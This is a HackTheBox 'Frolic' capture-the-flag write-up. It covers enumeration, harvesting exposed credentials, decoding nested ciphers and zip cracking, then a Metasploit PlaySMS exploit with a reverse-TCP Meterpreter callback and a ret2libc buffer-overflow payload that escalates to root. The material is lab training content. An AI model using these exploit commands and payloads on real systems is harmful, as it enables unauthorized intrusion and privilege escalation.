# FROLIC

## NMAP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ nmap 10.10.10.111   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 03:13 EDT
Nmap scan report for 10.10.10.111
Host is up (0.32s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 47.70 seconds
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ nmap 10.10.10.111 -p 22,139,445,9999 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 03:15 EDT
Nmap scan report for 10.10.10.111
Host is up (0.32s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h37m45s, deviation: 3h10m31s, median: 12m14s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2021-08-13T12:57:32+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-13T07:27:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.88 seconds
```

## PORT 9999

### HTTP

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic1.png)

So there is another domain running on port 1880 ```http://forlic.htb:1880```

### GOBUSTER

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.111:9999 -t 100 -x .txt,.jpg,.php -q
/.hta.txt             (Status: 403) [Size: 178]
/.htaccess            (Status: 403) [Size: 178]
/.htpasswd.jpg        (Status: 403) [Size: 178]
/.htaccess.jpg        (Status: 403) [Size: 178]
/.hta.jpg             (Status: 403) [Size: 178]
/.htpasswd            (Status: 403) [Size: 178]
/.hta                 (Status: 403) [Size: 178]
/.htpasswd.txt        (Status: 403) [Size: 178]
/.htaccess.txt        (Status: 403) [Size: 178]
/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]   
/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/]  
```

### BACKUP

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic2.png)

So there is another directory ```/loop``` and also the two files ```password.txt and user.txt``` 

#### USER.TXT

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ curl http://10.10.10.111:9999/backup/user.txt                                   
user - admin
```

#### PASSWORD.TXT

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ curl http://10.10.10.111:9999/backup/password.txt
password - imnothuman
```

### DEV

#### GOBUSTER

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.111:9999/dev/ -t 100 -q
/.hta                 (Status: 403) [Size: 178]
/.htaccess            (Status: 403) [Size: 178]
/.htpasswd            (Status: 403) [Size: 178]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
/test                 (Status: 200) [Size: 5]                                             
```

#### BACKUP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ curl http://10.10.10.111:9999/dev/backup/
/playsms
```

### PLAYSMS

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic7.png)

### ADMIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic3.png)

#### SOURCE CODE

```js
<html>
<head>
<title>Crack me :|</title>
<!-- Include CSS File Here -->
<link rel="stylesheet" href="css/style.css"/>
<!-- Include JS File Here -->
<script src="js/login.js"></script>
</head>
<body>
<div class="container">
<div class="main">
<h2>c'mon i m hackable</h2>
<form id="form_id" method="post" name="myform">
<label>User Name :</label>
<input type="text" name="username" id="username"/>
<label>Password :</label>
<input type="password" name="password" id="password"/>
<input type="button" value="Login" id="submit" onclick="validate()"/>
</form>
<span><b class="note">Note : Nothing</b></span>
</div>
</div>
</body>
</html>
```

#### LOGIN.JS

```js
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```

```username == "admin" && password == "superduperlooperpassword_lol"```

## LOGIN ADMIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic4.png)

### DECODE

I use this [online tool](https://www.dcode.fr/cipher-identifier) to identify the cipher 
It tuens out to be ```Ook cipher``` 
I use this [oak decoder](https://www.dcode.fr/ook-language) to decode the text 

```
Nothing here check /asdiSIAJJ0QWE9JAS
```

## /asdiSIAJJ0QWE9JAS

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic5.png)

### DECODE

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d       
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   487    0   487    0     0   1061      0 --:--:-- --:--:-- --:--:--  1058
PK     É7M#�[�i index.phpUT     �|�[�|�[ux
                                          ^D�J�s�h�)�P�n
                                                        ��Ss�Jw▒܎��4��k�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8�����J2S�*�DЍ}�8dTQk������j_���▒���'xc��ݏt��75Q�
                                                             ���k,4��b)�4F��    ���������&q2o�WԜ�9P#�[�iPK       É7M#�[�i ▒��index.phpUT�|�[ux
                                                    PKO                  
```
The PK in the beginning and the PKO at the end looked sus

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   487    0   487    0     0   1326      0 --:--:-- --:--:-- --:--:--  1326
00000000: 504b 0304 1400 0900 0800 c389 374d 23fe  PK..........7M#.
00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e  [.....i.......in
00000020: 6465 782e 7068 7055 5409 0003 857c a75b  dex.phpUT....|.[
00000030: 857c a75b 7578 0b00 0104 0000 0000 0400  .|.[ux..........
00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b  ...^D..J.s.h.)..
00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc  .P.n...Ss..Jw...
00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8  ...4....k.z...U.
00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea  ..+X...P........
00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea  ...x_..N.[...S..
00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0  8......J2S.*..D.
000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4  .}.8dT.Q.k......
000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2  .j_.......'x.c..
000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95  ...t..75Q.......
000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609  .k.,4..b).4F....
000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4  .........&q2o.W.
000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069  ..9PK..#.[.....i
00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3  ...PK...........
00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009  .7M#.[.....i....
00000120: 0018 0000 0000 0001 0000 00a4 8100 0000  ................
00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385  .index.phpUT....
00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000  |.[ux...........
00000150: 0000 504b 0506 0000 0000 0100 0100 4f00  ..PK..........O.
00000160: 0000 0301 0000 0000                      ........
```

```
when a ZIP file is viewed in a text editor the first two bytes of the file are usually "PK"
```

## UNZIP

So now we know that it's a zip file

Trying to unzip the zip file it asks for a password so I use ```fcrackzip``` to bruteforce password

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip


PASSWORD FOUND!!!!: pw == password
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ unzip file.zip      
Archive:  file.zip
[file.zip] index.php password: 
  inflating: index.php         
```

## INDEX.PHP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/frolic]
└─$ cat index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

It looks like hex So I use [CyberChef](https://gchq.github.io/CyberChef/) to decode it 

Again it is encrypted and looks like bas64 

![](https://github.com/Leo-2807/Writeups/blob/main/images/frolic6.png)

Now we have ```brainfuck``` I use this [decoder](https://www.dcode.fr/brainfuck-language)


This is the decoded string
```
idkwhatispass
```

## LOGIN PLAYSMS

>user:admin and pass:idkwhatispass

## METASPLOIT SHELL

```
msf6 > search playsms

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution                             
   1  exploit/multi/http/playsms_template_injection  2020-02-05       excellent  Yes    PlaySMS index.php Unauthenticated Template Injection Code Execution                         
   2  exploit/multi/http/playsms_filename_exec       2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution                      

msf6 > use exploit/multi/http/playsms_uploadcsv_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/playsms_uploadcsv_exec) > optins
[-] Unknown command: optins.
msf6 exploit(multi/http/playsms_uploadcsv_exec) > options

Module options (exploit/multi/http/playsms_uploadcsv_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:ho
                                         st:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or h
                                         osts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4


msf6 exploit(multi/http/playsms_uploadcsv_exec) > set RPORT 9999
RPORT => 9999
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set RHOST 10.10.10.111
RHOST => 10.10.10.111
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set TARGETURI /playsms
TARGETURI => /admin
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set PASSWORD idkwhatispass
PASSWORD => idkwhatispass
msf6 exploit(multi/http/playsms_uploadcsv_exec) > exploit
```
using ```python -c 'import pty; pty.spawn("/bin/bash")'``` to stabilize shell

## USER.TXT

```
www-data@frolic:~$ cd /home
cd /home
www-data@frolic:/home$ ls
ls
ayush  sahay
www-data@frolic:/home$ cd ayush
cd ayush
www-data@frolic:/home/ayush$ ls
ls
user.txt
www-data@frolic:/home/ayush$ cat user.txt
cat user.txt
2ab95909cf509f85a6f476b59a0c2fe0
```

## USER --> ROOT

Checking files with suid bits set 

```
www-data@frolic:/home/ayush$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/sbin/mount.cifs
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/bin/umount
/bin/su
/bin/ntfs-3g
/home/ayush/.binary/rop
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

```/home/ayush/.binary/rop``` 

This file takes in an input as a message 
So I try to change the message into a command and check if it executes it

```
www-data@frolic:/home/ayush/.binary$ ./rop
./rop
[*] Usage: program <message>
www-data@frolic:/home/ayush/.binary$ ./rop id
./rop id
[+] Message sent: idwww-data@frolic:/home/ayush/.binary$ ./rop $id
./rop $id
[*] Usage: program <message>
www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print "abcde"')
./rop $(python -c 'print "abcde"')
[+] Message sent: abcde
```

Now I checked whether it is vulnerable to buffer overflow or not

```
www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print "abcde"*500')
./rop $(python -c 'print "a"*500')
Segmentation fault
```
Okay so we can use buffer overflow

While searching for possible attacks that can be performed with buffer overflow I came across [this](https://secureteam.co.uk/articles/how-return-oriented-programming-exploits-work/)

ROP attack or Return Oriented Programming attack

This is a big hint as the name of the binary is rop

On some more search I found that rop attack is a generization of the return-to-libc attack 

This [resource](https://niiconsulting.com/checkmate/2019/09/exploiting-buffer-overflow-using-return-to-libc/) is what I followed to execute this attack

To find the overflow length I manully changed the number of alphabet a that I supplied and found it to be ```52```

To execute this attack we will need
```
Base Address
System Address    
Exit Address
/bin/sh Address
```
These four addresses can be found using these commands

```
www-data@frolic:/home/ayush/.binary$ ldd rop 
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)    <-- this!
        /lib/ld-linux.so.2 (0xb7fdb000)
```
```
www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
```
```
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system"
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```
```
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit"
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
```
#### SCRIPT

```python
import struct
base = 0xb7e19000
binsh = 0x15ba0b
syst = 0x0003ada0
exit = 0x0002e9d0
syst_final = struct.pack("<I", base+syst)
binsh_final = struct.pack("<I", base+binsh)
binsh_final = struct.pack("<I", base+binsh)
exit_final = struct.pack("<I", base+exit)
buff = "A" * 52
buff += syst_final
buff += exit_final
buff += binsh_final
print buff
```

Now I change the script a bit to make it a one liner

The calculations that needs to be done

```
 0xb7e19000 + 0x0003ada0
 = 0xb7e53da0  # system

 0xb7e19000 + 0x15ba0b
 = 0xb7f74a0b  # /bin/sh

 0xb7e19000 + 0x0002e9d0
 = 0xb7e479d0  # exit
```
I do these using this [online calculator](https://www.calculator.net/hex-calculator.html)

The template needs to be ```"a" * 52 + SYSTEM + EXIT + /bin/sh```

```
www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
#whoami
root
#cd /root
#cat root.txt
85d3fdf03f969892538ba9a731826222
```
